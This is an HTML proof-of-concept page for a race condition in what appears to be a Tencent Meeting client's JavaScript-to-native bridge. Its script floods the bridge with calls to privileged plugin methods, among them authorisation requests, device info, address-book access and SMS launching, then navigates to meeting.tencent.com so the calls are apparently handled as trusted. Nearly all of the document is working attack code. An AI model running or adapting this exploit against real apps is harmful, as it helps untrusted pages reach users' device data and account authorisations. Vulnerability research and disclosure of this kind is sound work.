<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Race PoC - ShowToast</title></head>
<body>
<h2>Race Condition PoC: ShowToast</h2>
<pre id="log" style="font-size:12px;"></pre>
<script>
var log = document.getElementById('log');
function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }

function callJSBridge(module, method, params) {
    var callId = module + '_' + method + '_' + Date.now() + '_' + Math.random().toString(36).substr(2,4);
    var msg = JSON.stringify({
        module: module,
        method: method,
        event_name: callId,
        params: params || {}
    });
    try {
        JSCallJavaMgr.JSCallNative(msg);
        return true;
    } catch(e) {
        addLog('ERR: ' + e);
        return false;
    }
}

function doRace() {
    addLog('=== ShowToast Race PoC ===');
    addLog('URL: ' + location.href);

    // DevicePlugin 全部 method
    var methods = [
        ['DevicePlugin', 'GetClientInfo', {}],
        ['DevicePlugin', 'GetDeviceInfo', {}],
        ['DevicePlugin', 'GetQimei36', {}],
        ['DevicePlugin', 'CheckUpgrade', {}],
        ['DevicePlugin', 'GetAuthorizationInfo', {}],
        ['DevicePlugin', 'RequestAuthorization', {scope: 'scope.userInfo'}],
        ['DevicePlugin', 'IsSupportPendant', {}],
        ['DevicePlugin', 'ToggleRingingAudio', {}],
        ['DevicePlugin', 'OpenAddressBook', {}],
        ['DevicePlugin', 'RotateScreen', {orientation: 1}],
        ['DevicePlugin', 'SetScreenRotateEnable', {enable: true}],
        ['DevicePlugin', 'GetScreenOrientation', {}],
        ['DevicePlugin', 'Vibrate', {}],
        ['DevicePlugin', 'ScanQrcode', {}],
        ['DevicePlugin', 'LaunchSendSMS', {}],
        ['UIPlugin', 'ShowToast', {content: 'RACE_PWNED', duration: 5000, type: 0}],
        ['CommonPlugin', 'SetTitle', {title: 'HACKED'}],
    ];

    for (var i = 0; i < methods.length; i++) {
        callJSBridge(methods[i][0], methods[i][1], methods[i][2]);
    }
    addLog('Sent ' + methods.length + ' calls (DevicePlugin + ShowToast + SetTitle)');

    // 延迟 2s 让 IPC 到达主进程
    addLog('Waiting 2s...');
    setTimeout(function() {
        addLog('Navigating to meeting.tencent.com...');
        window.location.href = 'https://meeting.tencent.com/';
    }, 2000);
}

setTimeout(function() {
    addLog('Starting in 3s...');
    setTimeout(doRace, 3000);
}, 500);
</script>
</body>
</html>
